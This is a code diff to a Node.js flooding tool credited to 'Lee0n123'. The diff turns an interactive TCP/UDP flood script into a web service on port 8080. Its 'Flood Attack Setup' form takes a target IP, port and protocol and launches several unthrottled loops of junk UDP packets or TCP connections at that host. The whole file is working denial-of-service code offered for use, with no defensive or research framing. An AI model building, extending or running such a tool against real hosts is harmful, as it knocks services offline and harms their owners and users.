@@ -1,40 +1,18 @@
+const http = require('http');
+const url = require('url');
 const dgram = require('dgram');
 const net = require('net');
-const readline = require('readline');
 
-const rl = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout
-});
+const defaultTimes = 500;
+const defaultThreads = 5;
 
-const getArgs = () => {
-  return new Promise((resolve) => {
-    let args = {};
-    rl.question("Host IP: ", (ip) => {
-      args.ip = ip;
-      rl.question("Port: ", (port) => {
-        args.port = parseInt(port);
-        rl.question("UDP(y/n): ", (choice) => {
-          args.choice = choice.toLowerCase() === 'y';
-          rl.question("Packets per connection (default 50000): ", (times) => {
-            args.times = times ? parseInt(times) : 50000;
-            rl.question("Threads (default 5): ", (threads) => {
-              args.threads = threads ? parseInt(threads) : 5;
-              resolve(args);
-              rl.close();
-            });
-          });
-        });
-      });
-    });
-  });
-};
+let floodInstances = [];
 
 const runUDP = (ip, port, times) => {
   const data = Buffer.alloc(1024, 'X');
   const client = dgram.createSocket('udp4');
 
-  return () => {
+  const flood = () => {
     let i = Math.random() > 0.5 ? "[*]" : "[#]";
     setInterval(() => {
       for (let x = 0; x < times; x++) {
@@ -48,12 +26,15 @@ const runUDP = (ip, port, times) => {
       console.log(i + " Sent!!!");
     }, 0);
   };
+
+  floodInstances.push(flood);
+  flood();
 };
 
 const runTCP = (ip, port, times) => {
   const data = Buffer.alloc(16, 'X');
 
-  return () => {
+  const flood = () => {
     let i = Math.random() > 0.5 ? "[*]" : "[#]";
     const client = new net.Socket();
 
@@ -71,25 +52,58 @@ const runTCP = (ip, port, times) => {
       client.destroy();
     });
   };
+
+  floodInstances.push(flood);
+  flood();
 };
 
-const main = async () => {
-  console.log("--> C0de By Lee0n123 <--");
-  console.log("#-- TCP/UDP FLOOD --#");
+const requestListener = (req, res) => {
+  const query = url.parse(req.url, true).query;
+  
+  if (req.url.startsWith('/flood')) {
+    const ip = query.ip;
+    const port = parseInt(query.port, 10);
+    const protocol = query.protocol || 'udp';
 
-  const args = await getArgs();
-
-  const { ip, port, choice, times, threads } = args;
-
-  for (let y = 0; y < threads; y++) {
-    if (choice) {
-      const udpFlooder = runUDP(ip, port, times);
-      udpFlooder();
-    } else {
-      const tcpFlooder = runTCP(ip, port, times);
-      tcpFlooder();
+    if (!ip || isNaN(port) || port <= 0 || port > 65535) {
+      res.writeHead(400, { 'Content-Type': 'text/html' });
+      res.end('Invalid parameters. Usage: /flood?ip=<IP>&port=<port>&protocol=<udp|tcp>');
+      return;
     }
+
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(`Starting ${protocol.toUpperCase()} flood on ${ip}:${port}`);
+
+    for (let y = 0; y < defaultThreads; y++) {
+      if (protocol.toLowerCase() === 'udp') {
+        runUDP(ip, port, defaultTimes);
+      } else {
+        runTCP(ip, port, defaultTimes);
+      }
+    }
+  } else {
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(`
+      <html>
+      <body>
+        <h1>Flood Attack Setup</h1>
+        <form action="/flood">
+          IP Address: <input type="text" name="ip"><br>
+          Port: <input type="text" name="port"><br>
+          Protocol: <select name="protocol">
+                      <option value="udp">UDP</option>
+                      <option value="tcp">TCP</option>
+                    </select><br>
+          <input type="submit" value="Start Flood">
+        </form>
+      </body>
+      </html>
+    `);
   }
 };
 
-main();
+const server = http.createServer(requestListener);
+
+server.listen(8080, () => {
+  console.log('Server is listening on port 8080');
+});
